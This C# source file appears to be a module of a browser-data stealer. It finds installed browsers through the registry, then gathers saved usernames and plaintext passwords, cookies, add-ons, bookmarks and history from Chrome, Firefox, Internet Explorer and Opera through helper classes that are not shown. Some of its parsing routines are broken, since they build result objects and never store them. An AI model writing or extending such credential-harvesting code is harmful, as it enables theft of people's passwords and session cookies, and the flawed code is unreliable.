using Microsoft.Win32;
using Module_Browser_Info.Response;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Module_Browser_Info
{
    public class Module_Browser_Info
    {
        /// <summary>
        /// Gets the browser list.
        /// </summary>
        /// <returns>return OnGetBrowserListResponse browser name installed on the current system from regedit</returns>
        public static OnGetBrowserListResponse OnGetBrowserList()
        {
            OnGetBrowserListResponse ROnGetBrowserListResponse = new OnGetBrowserListResponse();
            try
            {
                RegistryKey browserKeys;
                browserKeys = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\WOW6432Node\Clients\StartMenuInternet");
                if (browserKeys == null)
                    browserKeys = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Clients\StartMenuInternet");
                ROnGetBrowserListResponse.BrowserList.AddRange(browserKeys.GetSubKeyNames());
            }
            catch (Exception ex)
            {
                ROnGetBrowserListResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
            return ROnGetBrowserListResponse;
        }

        /// <summary>
        /// Called when [get all browser passwords].
        /// </summary>
        /// <returns>OnGetAllBrowserPasswordsResponse class object</returns>
        public static OnGetAllBrowserPasswordsResponse OnGetAllBrowserPasswords()
        {
            OnGetAllBrowserPasswordsResponse ROnGetAllBrowserPasswordsResponse = new OnGetAllBrowserPasswordsResponse();
            try
            {
                OnGetBrowserListResponse Browsers = OnGetBrowserList();
                string BrowserSavedLoginsDataToParse = "";
                foreach (string BrowserName in Browsers.BrowserList)
                {
                    if (BrowserName == "Google Chrome")
                    {
                        BrowserSavedLoginsDataToParse = Chrome.Chrome.OnGetChromePasswords();

                    }
                    else if (BrowserName == "FIREFOX.EXE")
                    {
                        BrowserSavedLoginsDataToParse = Firefox.Firefox.OnGetFirefoxPassword();
                    }
                    else if (BrowserName == "IEXPLORE.EXE")
                    {
                        BrowserSavedLoginsDataToParse = IE.IE.OnGetIEPassword();
                    }
                    else if (BrowserName == "OperaStable")
                    {
                        BrowserSavedLoginsDataToParse = Opera.Opera.OnGetOperaPassword();
                    }

                    BrowserSavedLoginsDataParse(ROnGetAllBrowserPasswordsResponse, BrowserSavedLoginsDataToParse, BrowserName);
                }
            }
            catch (Exception ex)
            {
                ROnGetAllBrowserPasswordsResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }


            return ROnGetAllBrowserPasswordsResponse;
        }

        /// <summary>
        /// Browsers the saved logins data parse.
        /// </summary>
        /// <param name="ROnGetAllBrowserPasswordsResponse">The r on get all browser passwords response.</param>
        /// <param name="BrowserSavedLoginsDataToParse">The browser saved logins data to parse.</param>
        /// <param name="BrowserName">Name of the browser.</param>
        private static void BrowserSavedLoginsDataParse(OnGetAllBrowserPasswordsResponse ROnGetAllBrowserPasswordsResponse, string BrowserSavedLoginsDataToParse, string BrowserName)
        {
            try {
                string[] Lines = BrowserSavedLoginsDataToParse.Split("\r\n".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                OnGetAllBrowserPasswordsResponse.SavedLogins CurrentSavedLogins = null;
                foreach (string CurrentLine in Lines)
                {

                    if (CurrentLine.StartsWith("Url="))
                    {
                        CurrentSavedLogins = new OnGetAllBrowserPasswordsResponse.SavedLogins();
                        CurrentSavedLogins.TargetBrowserName = BrowserName;
                        //CurrentSavedLogins.Url = CurrentLine;
                        CurrentSavedLogins.Url = CurrentLine.Substring(4);
                    }
                    else if (CurrentLine.StartsWith("UserName="))
                    {
                        CurrentSavedLogins.UserName = CurrentLine.Substring(9);
                    }
                    else if (CurrentLine.StartsWith("Password="))
                    {
                        CurrentSavedLogins.Password = CurrentLine.Substring(9);
                        ROnGetAllBrowserPasswordsResponse.savedlogins.Add(CurrentSavedLogins);
                    }
                }
            }catch(Exception ex)
            {
                ROnGetAllBrowserPasswordsResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
        }

        /// <summary>
        /// Called when [get all browser addon list].
        /// </summary>
        /// <returns>OnGetAllBrowserAddonListResponse class object</returns>
        public static OnGetAllBrowserAddonListResponse OnGetAllBrowserAddonList()
        {
            OnGetAllBrowserAddonListResponse ROnGetAllBrowserAddonListResponse = new OnGetAllBrowserAddonListResponse();
            try
            {
                OnGetBrowserListResponse Browsers = OnGetBrowserList();
                List<string> AddonsToParse = null;
                foreach (string BrowserName in Browsers.BrowserList)
                {
                    if (BrowserName == "Google Chrome")
                    {
                        AddonsToParse = Chrome.Chrome.OnGetChromeAddonList();

                    }
                    else if (BrowserName == "FIREFOX.EXE")
                    {
                        AddonsToParse = Firefox.Firefox.OnGetFirefoxAddonList();
                    }
                    else if (BrowserName == "IEXPLORE.EXE")
                    {
                        AddonsToParse = IE.IE.OnGetIEAddonList();
                    }
                    else if (BrowserName == "OperaStable")
                    {
                        AddonsToParse = Opera.Opera.OnGetOperaAddonList();
                    }
                    BrowserAddonsDataParse(ROnGetAllBrowserAddonListResponse, AddonsToParse, BrowserName);
                }
            }
            catch (Exception ex)
            {
                ROnGetAllBrowserAddonListResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }


            return ROnGetAllBrowserAddonListResponse;
        }

        /// <summary>
        /// Browsers the addons data parse.
        /// </summary>
        /// <param name="ROnGetAllBrowserAddonListResponse">The r on get all browser addon list response.</param>
        /// <param name="BrowserAddonListDataToParse">The browser addon list data to parse.</param>
        /// <param name="BrowserName">Name of the browser.</param>
        private static void BrowserAddonsDataParse(OnGetAllBrowserAddonListResponse ROnGetAllBrowserAddonListResponse, List<string> BrowserAddonListDataToParse, string BrowserName)
        {
            try {
                foreach (string AddonName in BrowserAddonListDataToParse)
                {
                    OnGetAllBrowserAddonListResponse.AddonInfo addoninfo = new OnGetAllBrowserAddonListResponse.AddonInfo();
                    addoninfo.TargetBrowserName = BrowserName;
                    addoninfo.AddonName = AddonName;
                }
            }catch(Exception ex)
            {
                ROnGetAllBrowserAddonListResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
        }

        /// <summary>
        /// Called when [get all browser cookies].
        /// </summary>
        /// <returns>OnGetAllBrowserCookiesResponse class object</returns>
        public static OnGetAllBrowserCookiesResponse OnGetAllBrowserCookies()
        {
            OnGetAllBrowserCookiesResponse ROnGetAllBrowserCookiesResponse = new OnGetAllBrowserCookiesResponse();
            try
            {
                OnGetBrowserListResponse Browsers = OnGetBrowserList();
                List<BrowserCookie_Node> CookiesToParse = null;
                foreach (string BrowserName in Browsers.BrowserList)
                {
                    if (BrowserName == "Google Chrome")
                    {
                        CookiesToParse = Chrome.Chrome.OnGetChromeCookies();

                    }
                    else if (BrowserName == "FIREFOX.EXE")
                    {
                        CookiesToParse = Firefox.Firefox.OnGetFirefoxCookies();
                    }
                    else if (BrowserName == "IEXPLORE.EXE")
                    {
                        CookiesToParse = IE.IE.OnGetIECookies();
                    }
                    else if (BrowserName == "OperaStable")
                    {
                        CookiesToParse = Opera.Opera.OnGetOperaCookies();
                    }
                    BrowserCookiesDataParse(ROnGetAllBrowserCookiesResponse, CookiesToParse, BrowserName);
                }
            }
            catch (Exception ex)
            {
                ROnGetAllBrowserCookiesResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }


            return ROnGetAllBrowserCookiesResponse;
        }


        /// <summary>
        /// Browsers the cookies data parse.
        /// </summary>
        /// <param name="ROnGetAllBrowserCookiesResponse">The r on get all browser cookies response.</param>
        /// <param name="BrowserCookiesToParse">The browser cookies to parse.</param>
        /// <param name="BrowserName">Name of the browser.</param>
        private static void BrowserCookiesDataParse(OnGetAllBrowserCookiesResponse ROnGetAllBrowserCookiesResponse, List<BrowserCookie_Node> BrowserCookiesToParse, string BrowserName)
        {
            try
            {
                foreach (BrowserCookie_Node CookieNode in BrowserCookiesToParse)
                {
                    OnGetAllBrowserCookiesResponse.CookieInfo cookieinfo = new OnGetAllBrowserCookiesResponse.CookieInfo();
                    cookieinfo.TargetBrowserName = BrowserName;
                    cookieinfo.CookieNode = CookieNode;
                }
            }
            catch (Exception ex)
            {
                ROnGetAllBrowserCookiesResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
        }


        /// <summary>
        /// Called when [get all browser bookmarks].
        /// </summary>
        /// <returns>OnGetAllBrowserBookmarksResponse class object</returns>
        public static OnGetAllBrowserBookmarksResponse OnGetAllBrowserBookmarks()
        {
            OnGetAllBrowserBookmarksResponse ROnGetAllBrowserBookmarksResponse = new OnGetAllBrowserBookmarksResponse();
            try
            {
                OnGetBrowserListResponse Browsers = OnGetBrowserList();
                List<BrowserHistory_Node> BookmarksToParse = null;
                foreach (string BrowserName in Browsers.BrowserList)
                {
                    if (BrowserName == "Google Chrome")
                    {
                        BookmarksToParse = Chrome.Chrome.OnGetChromeBookmarks();

                    }
                    else if (BrowserName == "FIREFOX.EXE")
                    {
                        BookmarksToParse = Firefox.Firefox.OnGetFirefoxBookmarks();
                    }
                    else if (BrowserName == "IEXPLORE.EXE")
                    {
                        BookmarksToParse = IE.IE.OnGetIEBookmarks();
                    }
                    else if (BrowserName == "OperaStable")
                    {
                        BookmarksToParse = Opera.Opera.OnGetOperaBookmarks();
                    }
                    BrowserBookmarksDataParse(ROnGetAllBrowserBookmarksResponse, BookmarksToParse, BrowserName);
                }
            }
            catch (Exception ex)
            {
                ROnGetAllBrowserBookmarksResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }


            return ROnGetAllBrowserBookmarksResponse;
        }


        /// <summary>
        /// Browsers the bookmarks data parse.
        /// </summary>
        /// <param name="ROnGetAllBrowserBookmarksResponse">The r on get all browser bookmarks response.</param>
        /// <param name="BrowserBookmarksToParse">The browser bookmarks to parse.</param>
        /// <param name="BrowserName">Name of the browser.</param>
        private static void BrowserBookmarksDataParse(OnGetAllBrowserBookmarksResponse ROnGetAllBrowserBookmarksResponse, List<BrowserHistory_Node> BrowserBookmarksToParse, string BrowserName)
        {
            try
            {
                foreach (BrowserHistory_Node BookmarkNode in BrowserBookmarksToParse)
                {
                    OnGetAllBrowserBookmarksResponse.BookmarkInfo bookmarinfo = new OnGetAllBrowserBookmarksResponse.BookmarkInfo();
                    bookmarinfo.TargetBrowserName = BrowserName;
                    bookmarinfo.bookmarkNode = BookmarkNode;
                }
            }
            catch (Exception ex)
            {
                ROnGetAllBrowserBookmarksResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
        }



        /// <summary>
        /// Called when [get all browser histories].
        /// </summary>
        /// <returns> OnGetAllBrowserBookmarksResponse because history node and bookmark node is same</returns>
        public static OnGetAllBrowserBookmarksResponse OnGetAllBrowserHistories()
        {
            OnGetAllBrowserBookmarksResponse ROnGetAllBrowserBookmarksResponse = new OnGetAllBrowserBookmarksResponse();
            try
            {
                OnGetBrowserListResponse Browsers = OnGetBrowserList();
                List<BrowserHistory_Node> HistoriesToParse = null;
                foreach (string BrowserName in Browsers.BrowserList)
                {
                    if (BrowserName == "Google Chrome")
                    {
                        HistoriesToParse = Chrome.Chrome.OnGetChromeHistory();

                    }
                    else if (BrowserName == "FIREFOX.EXE")
                    {
                        HistoriesToParse = Firefox.Firefox.OnGetFirefoxHistory();
                    }
                    else if (BrowserName == "IEXPLORE.EXE")
                    {
                        HistoriesToParse = IE.IE.OnGetIEHistory();
                    }
                    else if (BrowserName == "OperaStable")
                    {
                        HistoriesToParse = Opera.Opera.OnGetOperaHistory();
                    }
                    BrowserBookmarksDataParse(ROnGetAllBrowserBookmarksResponse, HistoriesToParse, BrowserName);
                }
            }
            catch (Exception ex)
            {
                ROnGetAllBrowserBookmarksResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }


            return ROnGetAllBrowserBookmarksResponse;
        }

    }
}
